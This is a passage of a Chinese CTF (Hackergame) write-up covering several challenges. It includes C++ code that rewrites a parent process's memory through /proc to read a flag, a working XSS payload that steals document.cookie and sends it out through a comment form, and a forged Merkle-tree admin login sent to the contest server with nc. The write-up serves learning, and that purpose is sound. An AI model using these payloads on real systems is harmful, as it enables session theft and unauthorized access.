        long end = std::stol(line.substr(hyphen + 1, first_space), nullptr, 16);
        std::string mode = line.substr(first_space + 1, second_space - (first_space + 1));
        std::cout << start << " " << end << " " << mode << std::endl;

        if (mode.substr(0, 3) == "rw-") {
            break;
        }

        if (first_start == 0) {
            first_start = start;
        }
        last_end = end;
    }
    f.close();
    long len = last_end - first_start;
    std::cout
        << "first_start " << first_start
        << " last_end " << last_end
        << " len " << len
        << std::endl;

    std::string mem_path = "/proc/" + ppid + "/mem";
    int fd = open(mem_path.c_str(), O_RDWR);
    if (fd == -1) {
        perror("open mem");
        return 1;
    }
    // https://stackoverflow.com/questions/5216326/mmap-on-proc-pid-mem
    char *buf = (char *)malloc(len);
    if (lseek(fd, first_start, SEEK_SET) == -1) {
        perror("lseek first_start");
        return 1;
    }
    int num_read = read(fd, buf, len);
    if (num_read != len) {
        perror("read");
        return 1;
    }
    const char *ff = "/fakeflag";
    const char *tf = "/././flag";
    int l = strlen(ff);
    for (int i = 0; i < len; ++i) {
        if (memcmp(buf + i, ff, l) != 0) {
            continue;
        }
        std::cout << "found /fakeflag at offset " << i << std::endl;
        if (lseek(fd, first_start + i, SEEK_SET) == -1) {
            perror("lseek middle");
            return 1;
        }
        if (write(fd, tf, l) != l) {
            perror("write");
            return 1;
        }
    }
    close(fd);
    free(buf);

    char *arg[] = { "/usr/bin/cat", "/flag", NULL };
    char *env[] = { NULL };
    execve(arg[0], arg, env);
    perror("execve");
}
```

```plaintext
ppid is 8
cmdline /stage2/dev/shm/executable
94018563219456 94018563350528 r--p
94018563350528 94018564702208 r-xp
94018564702208 94018565046272 r--p
94018565046272 94018565136384 r--p
94018565136384 94018565140480 rw-p
first_start 94018563219456 last_end 94018565136384 len 1916928
found /fakeflag at offset 1483197
found /fakeflag at offset 1483221
flag{<Redacted>}
```

## 异星歧途

最好玩的一题。

打开游戏，先在 Settings - Controls 里了解一下快捷键。另外按 Esc
呼出菜单可以重新加载，F11 全屏。有些单词不懂，可以切换语言，但需要重启游戏。

在按钮附近可以看到一些紫灰色的处理器，有的大有的小，左键单击后点编辑按钮可以看到逻辑。
鼠标悬停可以看到说明。

第一排开关旁边的小处理器只在 `10100101` 的时候打开发电机。

第二排开关旁边的处理器将八个开关按二进制读到变量 `number`，要求这个数是完全平方数，且
1 和 6 两个开关是开启状态。写个脚本搜一下，发现答案唯一。

```python
for i in range(16):
    b = bin(i ** 2 + 2 ** 8)[3:]
    if b[0] == '1' and b[5] == '1':
        print(b)
# 11000100
```

第三排开关旁边的小处理器没看懂。

第三排开关旁边的处理器比较复杂，前 7 个开关各控制了一些设备，最后还用第 8
个开关跟第二排最后一个开关比较，不相同就强制某个组合。
一顿~~爆炸~~测试之后可以知道钍反应堆需要冷却液和粉红色的钍，冷却液需要水和蓝色的钛，
某些管道打开后会把液体漏掉。最终操作是先打开第 3 个开关关闭反应堆，打开第 1、5、6
个开关送入钍和冷却液，最后关闭第 3 个开关启用反应堆。

第四排开关每一个分别控制对应的能量源。这里的地图看起来有点复杂，其实原理很简单。
目标是要让左下角的发电机运行。蒸汽发电机需要可燃物和水，内燃机发电机只需要可燃物，
传送带需要能量才工作，而焚烧炉供能后则会销毁旁边的物品。顺着推导就可以知道需要的状态是
`01110111`。

最后是四排之间的顺序，前三排合起来生产爆炸物，第四排提供冷却液。
实验发现冲击反应堆没有冷却液会停止，所以好像顺序是任意的。

## 微积分计算小练习 2.0

尝试一下可以知道提交的评论会直接拼接到 HTML 里，大概是这个样子。

```python
'updateElement("#comment", "你留下的评论：' + comment + '");'
```

`updateElement` 会直接把传入的参数写进 `innerHTML`。测试的时候可以直接调用
`updateElement`，避免把结果页玩坏。

评论禁止了 ``& > < ' ( ) ` . , %``，而且限制不超过 25 个字符。
禁止的字符可以通过转义使用，但是 25 个字符实在太少了，光是 `\x3cimg src=1\x3e`
就要 17 个字符，连 onerror 都写不下。根据提示，应该是要从自定义的站点打开练习网站，
把信息传递过去。

首先想到的是 URL。Query string 访问起来太长了，fragment 看起来还行。
我们可以先闭合前面的双引号，然后把表达式拼接上去，最后再补上双引号。

`"+location["hash"]+"`

但是 `hash` 会被 URL encode，不能直接用。先不说 `decodeURIComponent`
根本塞不进去，在这个限制下可没法调用函数。想了半天怎么在 URL encode
过的情况下在前后加内容能变成能执行 JavaScript 的 HTML，没想出来。

然后想到了 `javascript:` 地址。尝试了一下，发现可以开一个数组，在里面用赋值表达式。

`"+[location=1]+"`

太长了，想了一会不知道怎么把 `hash` 放进去。

又想到用 `Referrer` 传信息，但是 `open` 没法改。

比赛快结束的时候看到群里有人说 8 字节可以完成，第一反应是这是什么魔法，
然后想到这样范围就小了很多。翻了翻
[Window](https://developer.mozilla.org/en-US/docs/Web/API/Window)，里面的
`name` 刚好是 `open` 可以控制的，而且不会被编码，那直接 `"+name+"` 就行了。

剩下的问题是怎么把 flag 传出来。尝试了 `console`、`alert` 和 `throw` 都没反应。bot
本身只浏览不做其他动作，翻了 selenium
[文档](https://www.selenium.dev/selenium/docs/api/py/common/selenium.common.exceptions.html)
，里面的异常基本都不会被页面的 JavaScript 触发。尝试 open 无法访问的 URL 也没动静。

然后终于想到用练习网站的评论功能。因为禁止了一部分字符，所以先 base64
编码，拆开分多次发。每发完一次需要将评论恢复成 `"+name+"`，以及修改 `substring`
的参数。

```html
<!DOCTYPE html>
<html>
    <script>
        window.open('http://web/result', '\x3Cimg src=1 onerror="fetch(\'http://web/result\', { \'method\': \'POST\', \'headers\': { \'Content-Type\': \'application/x-www-form-urlencoded\', }, \'body\': \'comment=\' + btoa(document.cookie).substring(50, 75), })" />');
        // const data = new URLSearchParams();
        // data.append('comment', 'bot');
        // fetch(
        //     // 'http://web/result',
        //     'http://202.38.93.111:10051/result',
        //     {
        //         'method': 'POST',
        //         'headers': {
        //             'Content-Type': 'application/x-www-form-urlencoded',
        //         },
        //         'body': 'comment=' + btoa(document.cookie).substring(0, 25),
        //     }
        // )
    </script>
</html>
```

base64 解码，`decodeURIComponent`，提交，提示错误。看了补充说明，原来要用
`urllib.parse.unquote_plus`。

## O(1) 用户登录系统

导入用户功能会用输入的用户列表建立一棵 SHA-1 Merkle Tree，登录时会用输入的用户信息和
sibling hash 计算出根节点，检查是否相同。限制是导入时用户名不能为 `admin`，但需要以
`admin` 身份登录才能拿到 flag。

想了一会，想到如果能找到一个 `user:pass` 格式的字符串，它的 SHA-1 开头刚好以
`b"admin:"` 开头，那么控制一下大小让父节点变成 `sha1(b"admin:..." +
sibling_hash)`，就可以直接用拼接后的 admin 登录了。因为要求开头 6 字节为固定值，
期望大概是 `2 ** 48` 次 hash。

简单测试了一下，Python 单线程只有大概 1MH/s，要跑几千天。搜索了一下，
没找到能满足要求的算法，毕竟 Bitcoin 的 PoW 也是这种形式。

SHA-1 有 length-extension attack，但这题好像用不上。

又找了一下，找到 hashcat。跑一下 benchmark，在我的 iGPU 上居然有 1GH/s
左右，太强了，感觉有希望。

然而 hashcat 是用来破解密码的，hash 只能用固定列表，不能满足这么奇怪的需求。
看了一下代码和
[文档](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-plugin-development-guide.md)
，应该可以改 OpenCL 代码里面的判断逻辑。话说代码好像只检查了 4 个 u32，一共 128 bits。

正准备动手，看到群里有人说这题其实很简单。我也觉得奇怪，题目的算力要求实在有点高。
又想了一下，其实可以反过来，让 `"admin:..."` hash 成
`b"user:pass"`，导入用户的时候导入 `b"user:pass"` 跟另一个 hash 拼接后的结果就行。
一开始没注意，但输入的内容需要能按 UTF-8 解码。

```python
from hashlib import sha1
import random

while True:
    preimage = ('admin:' + random.randbytes(8).hex()).encode()
    digest = sha1(preimage).digest()
    if digest.count(b':') != 1:
        continue
    if b'\n' in digest:
        continue
    user, pass_ = digest.split(b':')
    try:
        user.decode()
        pass_.decode()
    except UnicodeDecodeError:
        continue
    print(preimage)
    print(digest.hex())
    break
# b'admin:e099c03d200a7cbf'
# 48697e2e18dea3462a6902063369553a6720d4b2
```

```shell
extra_proof=01234567890123456789
innocent_user=Testla:Testla
echo 1 > input.txt
printf "%s" "$extra_proof" >> input.txt
echo 48697e2e18dea3462a6902063369553a6720d4b2 | xxd -r -p >> input.txt
echo >> input.txt
echo "$innocent_user" >> input.txt
echo EOF >> input.txt
echo 2 >> input.txt
echo "admin:e099c03d200a7cbf:$(printf "%s" "$extra_proof" | xxd -p)$(printf "%s" "$innocent_user" | sha1sum | cut -d " " -f 1)" >> input.txt
cat token.txt input.txt | nc 202.38.93.111 10094
```

## 小 Z 的谜题

约束不多，但确实错综复杂。想了半天没想到怎么搜，让 Z3 帮忙解。

```python
import itertools
import z3


bound = 5
constraints = ((1, 1, 3), (1, 2, 2), (1, 2, 4), (1, 4, 4), (2, 2, 2), (2, 2, 3))
count = [3, 4, 2, 2, 2, 3]
num_constraints = sum(count)
num_dims = len(constraints[0])
arrange = [[[0 for i in range(3)] for j in range(num_dims)] for k in range(num_constraints)]

solver = z3.Solver()
a = []
index = 0
for constraint, c in zip(constraints, count):
    for _ in range(c):
        element = [
            [
                z3.Int(f'a[{index}][{second_dim}][{k}]')
                for k in range(2)
            ]
            for second_dim in range(3)
        ]
        a.append(element)

        for second_dim in range(3):
            for k in range(2):
                solver.add(0 <= element[second_dim][k])
                solver.add(element[second_dim][k] <= 5)

        # stage 2
        for other_index in range(index):
            solver.add(z3.Or(*(
                z3.Or(
                    element[second_dim][1] <= a[other_index][second_dim][0],
                    a[other_index][second_dim][1] <= element[second_dim][0],
                )
                for second_dim in range(3)
            )))

        # stage 3
        solver.add(z3.Or(*(
            z3.And(*(
                element[second_dim][1] - element[second_dim][0] == diff[second_dim]
                for second_dim in range(3)
            ))
            for diff in set(itertools.permutations(constraint))
        )))

        index += 1

check_result = solver.check()
print(check_result)
if check_result != z3.sat:
    exit(1)
m = solver.model()
l = [
    [
        [
            m[a[i][j][k]].as_long()
            for k in range(2)
        ]
        for j in range(num_dims)
    ]
    for i in range(num_constraints)
]
l = sorted(l)
for i in range(num_constraints):
    for j in range(num_dims):
        for k in range(2):
            print(l[i][j][k], end='')
print()
```

用时十来秒，解出来分数是 147，能拿到 flag1。

flag2 和 flag3 分别要求分数 \<= 136 和 \>= 157。分数是笛卡尔积的集合大小，但是
`SetHasSize` 由于实现问题被
[移除](https://github.com/Z3Prover/z3/issues/3854) 了。一顿搜索，找到一个
[回答](https://stackoverflow.com/questions/74265354/z3-how-to-count-matches)
。先用 7 进制编码 tuple，然后统计 `IsMember`，写了
[calculate_score.py](./26-小%20Z%20的谜题/calculate_score.py)。

运行起来好一会不出解，感觉不妙。换一个思路，不停地生成新的解，手动计算 score。
参考这个
[回答](https://stackoverflow.com/questions/11867611/z3py-checking-all-solutions-for-equation/70656700#70656700)
写了 [all_smt.py](./26-小%20Z%20的谜题/all_smt.py)。

```plaintext
score=147
010103011504040135041545130203132304133502133523133534141234350201350213352502352524450235452545
score=144
021413023535024513030145031335040104041501231513233535341214350245352335352513353535450204452501
score=144
020202022324022402023424030145030224041545044504230202232404341434350135350203352403451535454503
score=151
010301013502013524020213022315023545030235123414150401154504230413252435254545350214350245352413
score=147
010424030202032402034501040445044515130224133424152324343414350224350302353501450345453513453535
score=146
010103010235022535023502031302041523141234150104150245242535243502341302451324451502452545453524
score=146
022402022424030145030202030224041545044504232404341434350102350135350423351402451335453535454503
```

运行起来很快出了 7 组解，然后就不动了。尝试帮 Z3 剪枝，要求 stage 3 每种 constraint
内部的组合不重复。又写了
[search.py](./26-小%20Z%20的谜题/search.py)。

还是不出解，又瞎改了一下，遇到 unsat 的时候快速 backtrack。几分钟跑完，unsat。

放着几个脚本去睡觉。最后 `all_smt.py` 和 `calculate_score.py` 都跑了十多个小时，
前者第 8 个解一直出不来，后者没出解，`search.py` 跑了 5 个小时到 `4851/189000`，
估计一共要十多天。比赛结束。

看了题解，估计是算分数时用的 `IsMember` 的锅。早知道不弄这些花里胡哨的，直接塞
`== && == && ==`。

## 部分没通过的题目

### 逆向工程不需要 F5

用 ghidra 打开，关联动态库，原来不是不需要 F5，是 F5 不工作。函数直接违反调用约定，
写了一些奇怪的汇编。ghidra 反编译器认为这些汇编没效果，但实际是有的。估计来不及看，
就去写小 Z 了。刚看到的时候也想到了 Hackergame 2021
[超 OI 的 Writeup 模拟器](https://github.com/USTC-Hackergame/hackergame2021-writeups/blob/master/official/%E8%B6%85%20OI%20%E7%9A%84%20Writeup%20%E6%A8%A1%E6%8B%9F%E5%99%A8/README.md)
里看到的 angr，不过没用过而且不知道是否支持动态库。

## 感想

公布日程：GeekGame-3rd 后只有几天时间休息，难顶。

读题做题：怎么 MyGO!!!!! 含量比 GeekGame-3rd 还高（狂喜），给人一种 MyGO
火了的感觉。

网友们的数理基础竟如此扎实.jxl
